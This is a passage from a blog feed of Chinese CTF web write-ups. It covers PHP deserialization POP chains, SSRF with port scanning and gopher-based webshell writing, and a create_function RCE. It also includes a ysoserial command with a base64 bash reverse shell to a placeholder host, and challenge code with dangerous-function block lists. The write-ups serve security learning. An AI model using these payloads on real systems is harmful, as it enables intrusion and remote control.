class="title">User</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $age,$sex,$num;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        $student = <span class="keyword">$this</span>-&gt;age;</span><br><span class="line">        $boy = <span class="keyword">$this</span>-&gt;sex;</span><br><span class="line">        $a = <span class="keyword">$this</span>-&gt;num;</span><br><span class="line">    $student-&gt;$boy();</span><br><span class="line">    <span class="keyword">if</span>(!(is_string($a)) ||!(is_string($boy)) || !(is_object($student)))</span><br><span class="line">    &#123;</span><br><span class="line">        ob_end_clean();</span><br><span class="line">        <span class="keyword">exit</span>();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">global</span> $$a;</span><br><span class="line">    $result=$GLOBALS[<span class="string">'flag'</span>];</span><br><span class="line">        ob_end_clean();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_GET[<span class="string">'x'</span>])) &#123;</span><br><span class="line">    unserialize($_GET[<span class="string">'x'</span>])-&gt;get_it();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>题目存在ssrf.php，想要知道源码，就必须先获取$flag的值，观察类定义，只有一个destruct可用，其中存在3个关键点：<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$student-&gt;$boy();</span><br><span class="line"><span class="keyword">global</span> $$a;</span><br><span class="line">ob_end_clean();</span><br></pre></td></tr></table></figure></p><p>首先可以调对象的任意方法，其次存在变量覆盖，我们可以global任意变量，最后有ob_end_clean，我们拿不到输出。<br>同时注意到：<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">unserialize($_GET[<span class="string">'x'</span>])-&gt;get_it()</span><br></pre></td></tr></table></figure></p><p>如果单独传入类则会由于没有__call方法而报错。结合上述问题，这里我们考虑用如下方式进行bypass：<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">@error_reporting(<span class="number">1</span>);</span><br><span class="line">$flag=<span class="string">'123'</span>;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Pass</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">User</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $age,$sex,$num;</span><br><span class="line">&#125;</span><br><span class="line">$a = <span class="keyword">new</span> Pass();</span><br><span class="line">$b = <span class="keyword">new</span> User();</span><br><span class="line">$b-&gt;age = $a;</span><br><span class="line">$b-&gt;sex = <span class="string">'read'</span>;</span><br><span class="line">$b-&gt;num = <span class="string">'result'</span>;</span><br><span class="line">$c = <span class="keyword">new</span> User();</span><br><span class="line">$c-&gt;age = $a;</span><br><span class="line">$c-&gt;sex = <span class="string">'read'</span>;</span><br><span class="line">$c-&gt;num = <span class="string">'this'</span>;</span><br><span class="line">$d = serialize(<span class="keyword">array</span>($b,$c));</span><br><span class="line"><span class="keyword">echo</span> urlencode($d);</span><br></pre></td></tr></table></figure></p><p>可利用global $this出错：<br><img src="/images/2020-08-23-13-15-33.png" alt=""><br>让ob_end_clean无法清空缓冲区，从而获取输出：<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="comment">//经过扫描确认35000以下端口以及50000以上端口不存在任何内网服务,请继续渗透内网</span></span><br><span class="line">    $url = $_GET[<span class="string">'we_have_done_ssrf_here_could_you_help_to_continue_it'</span>] ?? <span class="keyword">false</span>; </span><br><span class="line"><span class="keyword">if</span>(preg_match(<span class="string">"/flag|var|apache|conf|proc|log/i"</span> ,$url))&#123;</span><br><span class="line"><span class="keyword">die</span>(<span class="string">""</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>($url)</span><br><span class="line">    &#123; </span><br><span class="line"></span><br><span class="line">            $ch = curl_init(); </span><br><span class="line">            curl_setopt($ch, CURLOPT_URL, $url); </span><br><span class="line">            curl_setopt($ch, CURLOPT_HEADER, <span class="number">1</span>);</span><br><span class="line">            curl_exec($ch);</span><br><span class="line">            curl_close($ch); </span><br><span class="line"></span><br><span class="line">     &#125; </span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></p><p>通过:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://39.98.131.124/ssrf.php?we_have_done_ssrf_here_could_you_help_to_continue_it=127.0.0.1</span><br></pre></td></tr></table></figure></p><p>进行端口爆破，burp跑一遍，发现开放端口为40000：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://39.98.131.124/ssrf.php?we_have_done_ssrf_here_could_you_help_to_continue_it=127.0.0.1:40000</span><br></pre></td></tr></table></figure></p><p><img src="/images/2020-08-23-13-17-15.png" alt=""><br>查看参数名为：<br><img src="/images/2020-08-23-13-17-40.png" alt=""><br>猜想后端代码为：<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">file_put_contents($file,$content);</span><br></pre></td></tr></table></figure></p><p>同时脑洞想到，文件上传目录为127.0.0.1:40000/uploads/PHPSESSID/<br>利用gopher传递数据，发现简单的使：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">file=1.php&amp;content=&lt;?php phpinfo();?&gt;</span><br></pre></td></tr></table></figure></p><p>会导致文件没有正常生成，原因应该是content被过滤了，简单测试，发现过滤了：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;? ph</span><br></pre></td></tr></table></figure></p><p>因此考虑使用伪协议写入内容，为避免过滤，直接选择了一个冷门的:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">file=php://filter/convert.iconv.UCS-4LE.UCS-4*/resource=shell.php&amp;content=hp?&lt;   pave@_$(l[TEG]&quot;a&quot;&gt;?;)</span><br></pre></td></tr></table></figure></p><p>即可写入shell：<br><img src="/images/2020-08-23-13-21-11.png" alt=""><br>尝试cat flag，但是发现存在open_basedir，这里使用一些常规的绕过方案：<br><img src="/images/2020-08-23-13-28-31.png" alt=""><br>即可看到flag，读取即可。</p><h2 id="easy-java"><a href="#easy-java" class="headerlink" title="easy_java"></a>easy_java</h2><p>首先发现存在反序列化点：<br><img src="/images/2020-08-23-16-16-02.png" alt=""><br>同时看到黑名单：<br><img src="/images/2020-08-23-16-13-57.png" alt=""><br>发现未对JRMPListener做过滤，查看pom.xml：<br><img src="/images/2020-08-23-16-18-14.png" alt=""><br>发现有commons-collections依赖，因此利用ysoserial来生成exp：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">java -cp ysoserial-0.0.6-SNAPSHOT-all.jar ysoserial.exploit.JRMPListener 23334 CommonsCollections5 &quot;bash -c &#123;echo,YmFzaCAtaSA+JiAvZGV2L3RjcC94eHgueHh4Lnh4eC54eHgvMjMzMzMgMD4mMQ==&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;&quot;</span><br><span class="line"></span><br><span class="line">java -jar ysoserial-0.0.6-SNAPSHOT-all.jar JRMPClient xxx.xxx.xxx.xxx:23334 &gt; 1.poc</span><br></pre></td></tr></table></figure></p><p><img src="/images/2020-08-23-16-27-26.png" alt=""><br><img src="/images/2020-08-23-16-26-45.png" alt=""><br>即可反弹shell，并获取flag。</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h2&gt;&lt;p&gt;周末参加了强网杯线上赛，以下是web题解。&lt;/p&gt;
&lt;h2 id=&quot;web辅助&quot;&gt;&lt;a href=&quot;#web辅助&quot; class=&quot;heade
      
    
    </summary>
    
      <category term="web" scheme="http://skysec.top/categories/web/"/>
    
    
      <category term="web" scheme="http://skysec.top/tags/web/"/>
    
  </entry>
  
  <entry>
    <title>2020 全国大学生信息安全竞赛Online Web题解</title>
    <link href="http://skysec.top/2020/08/20/2020-%E5%85%A8%E5%9B%BD%E5%A4%A7%E5%AD%A6%E7%94%9F%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E7%AB%9E%E8%B5%9BOnline-Web%E9%A2%98%E8%A7%A3/"/>
    <id>http://skysec.top/2020/08/20/2020-全国大学生信息安全竞赛Online-Web题解/</id>
    <published>2020-08-20T07:12:50.000Z</published>
    <updated>2020-08-20T11:52:45.507Z</updated>
    
    <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>周末参加了一下国赛，有两年没参与了，还是一如既往的“吓人”，XD</p><h2 id="babyunserialize"><a href="#babyunserialize" class="headerlink" title="babyunserialize"></a>babyunserialize</h2><p>题目存在源码泄露：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://eci-2ze0loaxjkuesryhroqr.cloudeci1.ichunqiu.com/www.zip</span><br></pre></td></tr></table></figure></p><p>打开后发现是fatfree框架，进行代码审计，发现目标网站使用了php框架fatfree，且为最新版。同时关注到index.php路由：<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">$f3-&gt;route(<span class="string">'GET /'</span>,</span><br><span class="line">    <span class="function"><span class="keyword">function</span><span class="params">($f3)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"may be you need /?flag="</span>;</span><br><span class="line">    &#125;</span><br><span class="line">);</span><br><span class="line"></span><br><span class="line">unserialize($_GET[<span class="string">'flag'</span>]);</span><br></pre></td></tr></table></figure></p><p>发现题目给了一个反序列化位置，且参数可控。<br>于是在网上搜索fatfree相关的rce chain，可以搜到此题曾在2020 WMCTF中出现过。<br>但搜索网上相关的pop chain，发现都没打通，于是选择自己思考。<br>虽然这里CLI\Agent::fetch()被删除，但其存在的send方法潜在安全隐患：<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">send</span><span class="params">($op,$data=<span class="string">''</span>)</span> </span>&#123;</span><br><span class="line">$server=<span class="keyword">$this</span>-&gt;server;</span><br><span class="line">$mask=WS::Finale | $op &amp; WS::OpCode;</span><br><span class="line">$len=strlen($data);</span><br><span class="line">$buf=<span class="string">''</span>;</span><br><span class="line"><span class="keyword">if</span> ($len&gt;<span class="number">0xffff</span>)</span><br><span class="line">$buf=pack(<span class="string">'CCNN'</span>,$mask,<span class="number">0x7f</span>,$len);</span><br><span class="line"><span class="keyword">elseif</span> ($len&gt;<span class="number">0x7d</span>)</span><br><span class="line">$buf=pack(<span class="string">'CCn'</span>,$mask,<span class="number">0x7e</span>,$len);</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">$buf=pack(<span class="string">'CC'</span>,$mask,$len);</span><br><span class="line">$buf.=$data;</span><br><span class="line"><span class="keyword">if</span> (is_bool($server-&gt;write(<span class="keyword">$this</span>-&gt;socket,$buf)))</span><br><span class="line"><span class="keyword">return</span> <span class="keyword">FALSE</span>;</span><br><span class="line"><span class="keyword">if</span> (!in_array($op,[WS::Pong,WS::Close]) &amp;&amp;</span><br><span class="line"><span class="keyword">isset</span>(<span class="keyword">$this</span>-&gt;server-&gt;events[<span class="string">'send'</span>]) &amp;&amp;</span><br><span class="line">is_callable($func=<span class="keyword">$this</span>-&gt;server-&gt;events[<span class="string">'send'</span>]))</span><br><span class="line">$func(<span class="keyword">$this</span>,$op,$data);</span><br><span class="line"><span class="keyword">return</span> $data;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>此处注意到关键位置：<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (is_bool($server-&gt;write(<span class="keyword">$this</span>-&gt;socket,$buf)))</span><br><span class="line"><span class="keyword">return</span> <span class="keyword">FALSE</span>;</span><br></pre></td></tr></table></figure></p><p>我们发现，此处$server和$this-&gt;socket均可控，那么可以用来构造任意代码执行。但是存在问题，哪一个命令执行的php函数有2个参数，且第一个参数可控，第二个参数不可控就可以进行RCE？<br>这里想到create_function，我们可以利用如下方式，在第一个参数位置进行代码注入：<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">)&#123;&#125;phpinfo();<span class="comment">//</span></span><br></pre></td></tr></table></figure></p><p>构造exp，并发现可以成功执行phpinfo：<br><img src="/images/2020-08-20-15-45-48.png" alt=""><br>得到flag:<br><img src="/images/2020-08-20-15-46-00.png" alt=""></p><h2 id="easyphp"><a href="#easyphp" class="headerlink" title="easyphp"></a>easyphp</h2><p>题目给出了源码：<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="comment">//题目环境：php:7.4.8-apache</span></span><br><span class="line">    $pid = pcntl_fork();</span><br><span class="line">    <span class="keyword">if</span> ($pid == <span class="number">-1</span>) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">'could not fork'</span>);</span><br><span class="line">    &#125;<span class="keyword">else</span> <span class="keyword">if</span> ($pid)&#123;</span><br><span class="line">        $r=pcntl_wait($status);</span><br><span class="line">        <span class="keyword">if</span>(!pcntl_wifexited($status))&#123;</span><br><span class="line">            phpinfo();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">'a'</span>])&amp;&amp;is_string($_GET[<span class="string">'a'</span>])&amp;&amp;!preg_match(<span class="string">"/[:\\\\]|exec|pcntl/i"</span>,$_GET[<span class="string">'a'</span>]))&#123;</span><br><span class="line">            call_user_func_array($_GET[<span class="string">'a'</span>],[$_GET[<span class="string">'b'</span>],<span class="keyword">false</span>,<span class="keyword">true</span>]);</span><br><span class="line">        &#125;</span><br><span class="line">        posix_kill(posix_getpid(), SIGUSR1);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure></p><p>此题有点不同寻常，和一般的web题有点差异，这里简单看了一下，我们需要在如下情况，才能调用phpinfo():<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(!pcntl_wifexited($status))&#123;</span><br><span class="line">        phpinfo();</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure></p><p>查阅手册：<br><img src="/images/2020-08-20-15-34-40.png" alt=""><br>发现我们需要让子进程不正常退出，这里考虑到使用后面的call_user_func:<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">'a'</span>])&amp;&amp;is_string($_GET[<span class="string">'a'</span>])&amp;&amp;!preg_match(<span class="string">"/[:\\\\]|exec|pcntl/i"</span>,$_GET[<span class="string">'a'</span>]))&#123;</span><br><span class="line">            call_user_func_array($_GET[<span class="string">'a'</span>],[$_GET[<span class="string">'b'</span>],<span class="keyword">false</span>,<span class="keyword">true</span>]);</span><br><span class="line">        &#125;</span><br></pre></td></tr></table></figure></p><p>通过搜索php bug，可以得知：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://bugs.php.net/bug.php?id=52173</span><br></pre></td></tr></table></figure></p><p>这里我们可以利用pcntl_waitpid：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://eci-2ze0y4x958n2qhsgv27b.cloudeci1.ichunqiu.com/?a=call_user_func&amp;b=pcntl_waitpid</span><br></pre></td></tr></table></figure></p><p><img src="/images/2020-08-20-15-39-33.png" alt=""><br>即可在phpinfo中获取flag。</p><h2 id="rceme"><a href="#rceme" class="headerlink" title="rceme"></a>rceme</h2><p>题目给出了源码：<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">parserIfLabel($_GET[<span class="string">'a'</span>]);</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">danger_key</span><span class="params">($s)</span> </span>&#123;</span><br><span class="line">    $s=htmlspecialchars($s);</span><br><span class="line">    $key=<span class="keyword">array</span>(<span class="string">'php'</span>,<span class="string">'preg'</span>,<span class="string">'server'</span>,<span class="string">'chr'</span>,<span class="string">'decode'</span>,<span class="string">'html'</span>,<span class="string">'md5'</span>,<span class="string">'post'</span>,<span class="string">'get'</span>,<span class="string">'request'</span>,<span class="string">'file'</span>,<span class="string">'cookie'</span>,<span class="string">'session'</span>,<span class="string">'sql'</span>,<span class="string">'mkdir'</span>,<span class="string">'copy'</span>,<span class="string">'fwrite'</span>,<span class="string">'del'</span>,<span class="string">'encrypt'</span>,<span class="string">'$'</span>,<span class="string">'system'</span>,<span class="string">'exec'</span>,<span class="string">'shell'</span>,<span class="string">'open'</span>,<span class="string">'ini_'</span>,<span class="string">'chroot'</span>,<span class="string">'eval'</span>,<span class="string">'passthru'</span>,<span class="string">'include'</span>,<span class="string">'require'</span>,<span class="string">'assert'</span>,<span class="string">'union'</span>,<span class="string">'create'</span>,<span class="string">'func'</span>,<span class="string">'symlink'</span>,<span class="string">'sleep'</span>,<span class="string">'ord'</span>,<span class="string">'str'</span>,<span class="string">'source'</span>,<span class="string">'rev'</span>,<span class="string">'base_convert'</span>);</span><br><span class="line">    $s = str_ireplace($key,<span class="string">"*"</span>,$s);</span><br><span class="line">    $danger=<span class="keyword">array</span>(<span class="string">'php'</span>,<span class="string">'preg'</span>,<span class="string">'server'</span>,<span class="string">'chr'</span>,<span class="string">'decode'</span>,<span class="string">'html'</span>,<span class="string">'md5'</span>,<span class="string">'post'</span>,<span class="string">'get'</span>,<span class="string">'request'</span>,<span class="string">'file'</span>,<span class="string">'cookie'</span>,<span class="string">'session'</span>,<span class="string">'sql'</span>,<span class="string">'mkdir'</span>,<span class="string">'copy'</span>,<span class="string">'fwrite'</span>,<span class="string">'del'</span>,<span class="string">'encrypt'</span>,<span class="string">'$'</span>,<span class="string">'system'</span>,<span class="string">'exec'</span>,<span class="string">'shell'</span>,<span class="string">'open'</span>,<span class="string">'ini_'</span>,<span class="string">'chroot'</span>,<span class="string">'eval'</span>,<span class="string">'passthru'</span>,<span class="string">'include'</span>,<span class="string">'require'</span>,<span class="string">'assert'</span>,<span class="string">'union'</span>,<span class="string">'create'</span>,<span class="string">'func'</span>,<span class="string">'symlink'</span>,<span class="string">'sleep'</span>,<span class="string">'ord'</span>,<span class="string">'str'</span>,<span class="string">'source'</span>,<span class="string">'rev'</span>,<span class="string">'base_convert'</span>);</span><br><span class="line">    <span class="keyword">foreach</span> ($danger <span class="keyword">as</span> $val)&#123;</span><br><span class="line">        <span class="keyword">if</span>(strpos($s,$val) !==<span class="keyword">false</span>)&#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">'很抱歉，执行出错，发现危险字符【'</span>.$val.<span class="string">'】'</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(preg_match(<span class="string">"/^[a-z]$/i"</span>))&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">'很抱歉，执行出错，发现危险字符'</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> $s;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">parserIfLabel</span><span class="params">( $content )</span> </span>&#123;</span><br><span class="line">    $pattern = <span class="string">'/\&#123;if:([\s\S]+?)&#125;([\s\S]*?)&#123;end\s+if&#125;/'</span>;</span><br><span class="line">    <span class="keyword">if</span> ( preg_match_all( $pattern, $content, $matches ) ) &#123;</span><br><span class="line">        $count = count( $matches[ <span class="number">0</span> ] );</span><br><span class="line">        <span class="keyword">for</span> ( $i = <span class="number">0</span>; $i &lt; $count; $i++ ) &#123;</span><br><span class="line">            $flag = <span class="string">''</span>;</span><br><span class="line">            $out_html = <span class="string">''</span>;</span><br><span class="line">            $ifstr = $matches[ <span class="number">1</span> ][ $i ];</span><br><span class="line">            $ifstr=danger_key($ifstr,<span class="number">1</span>);</span><br><span class="line">            <span class="keyword">if</span>(strpos($ifstr,<span class="string">'='</span>) !== <span class="keyword">false</span>)&#123;</span><br><span class="line">                $arr= splits($ifstr,<span class="string">'='</span>);</span><br><span class="line">                <span class="keyword">if</span>($arr[<span class="number">0</span>]==<span class="string">''</span> || $arr[<span class="number">1</span>]==<span class="string">''</span>)&#123;</span><br><span class="line">                    <span class="keyword">die</span>(<span class="string">'很抱歉，模板中有错误的判断,请修正【'</span>.$ifstr.<span class="string">'】'</span>);</span><br><span class="line">                &#125;</span><br><span class="line">                $ifstr = str_replace( <span class="string">'='</span>, <span class="string">'=='</span>, $ifstr );</span><br><span class="line">            &#125;</span><br><span class="line">            $ifstr = str_replace( <span class="string">'&lt;&gt;'</span>, <span class="string">'!='</span>, $ifstr );</span><br><span class="line">            $ifstr = str_replace( <span class="string">'or'</span>, <span class="string">'||'</span>, $ifstr );</span><br><span class="line">            $ifstr = str_replace( <span class="string">'and'</span>, <span class="string">'&amp;&amp;'</span>, $ifstr );</span><br><span class="line">            $ifstr = str_replace( <span class="string">'mod'</span>, <span class="string">'%'</span>, $ifstr );</span><br><span class="line">            $ifstr = str_replace( <span class="string">'not'</span>, <span class="string">'!'</span>, $ifstr );</span><br><span class="line">            <span class="keyword">if</span> ( preg_match( <span class="string">'/\&#123;|&#125;/'</span>, $ifstr)) &#123;</span><br><span class="line">                <span class="keyword">die</span>(<span class="string">'很抱歉，模板中有错误的判断,请修正'</span>.$ifstr);</span><br><span class="line">            &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                @<span class="keyword">eval</span>( <span class="string">'if('</span> . $ifstr . <span class="string">')&#123;$flag="if";&#125;else&#123;$flag="else";&#125;'</span> );</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> ( preg_match( <span class="string">'/([\s\S]*)?\&#123;else\&#125;([\s\S]*)?/'</span>, $matches[ <span class="number">2</span> ][ $i ], $matches2 ) ) &#123;</span><br><span class="line">                <span class="keyword">switch</span> ( $flag ) &#123;</span><br><span class="line">                    <span class="keyword">case</span> <span class="string">'if'</span>:</span><br><span class="line">                        <span class="keyword">if</span> ( <span class="keyword">isset</span>( $matches2[ <span class="number">1</span> ] ) ) &#123;</span><br><span class="line">                            $out_html .= $matches2[ <span class="number">1</span> ];</span><br><span class="line">                        &#125;</span><br><span class="line">                        <span class="keyword">break</span>;</span><br><span class="line">                    <span class="keyword">case</span> <span class="string">'else'</span>:</span><br><span class="line">                        <span class="keyword">if</span> ( <span class="keyword">isset</span>( $matches2[ <span class="number">2</span> ] ) ) &#123;</span><br><span class="line">                            $out_html .= $matches2[ <span class="number">2</span> ];</span><br><span class="line">                        &#125;</span><br><span class="line">                        <span class="keyword">break</span>;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125; <span class="keyword">elseif</span> ( $flag == <span class="string">'if'</span> ) &#123;</span><br><span class="line">                $out_html .= $matches[ <span class="number">2</span> ][ $i ];</span><br><span class="line">            &#125;</span><br><span class="line">            $pattern2 = <span class="string">'/\&#123;if([0-9]):/'</span>;</span><br><span class="line">            <span class="keyword">if</span> ( preg_match( $pattern2, $out_html, $matches3 ) ) &#123;</span><br><span class="line">                $out_html = str_replace( <span class="string">'&#123;if'</span> . $matches3[ <span class="number">1</span> ], <span class="string">'&#123;if'</span>, $out_html );</span><br><span class="line">                $out_html = str_replace( <span class="string">'&#123;else'</span> . $matches3[ <span class="number">1</span> ] . <span class="string">'&#125;'</span>, <span class="string">'&#123;else&#125;'</span>, $out_html );</span><br><span class="line">                $out_html = str_replace( <span class="string">'&#123;end if'</span> . $matches3[ <span class="number">1</span> ] . <span class="string">'&#125;'</span>, <span class="string">'&#123;end if&#125;'</span>, $out_html );</span><br><span class="line">                $out_html = <span class="keyword">$this</span>-&gt;parserIfLabel( $out_html );</span><br><span class="line">            &#125;</span><br><span class="line">            $content = str_replace( $matches[ <span class="number">0</span> ][ $i ], $out_html, $content );</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> $content;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">splits</span><span class="params">( $s, $str=<span class="string">','</span> )</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> ( <span class="keyword">empty</span>( $s ) ) <span class="keyword">return</span> <span class="keyword">array</span>( <span class="string">''</span> );</span><br><span class="line">    <span class="keyword">if</span> ( strpos( $s, $str ) !== <span class="keyword">false</span> ) &#123;</span><br><span class="line">        <span class="keyword">return</span> explode( $str, $s 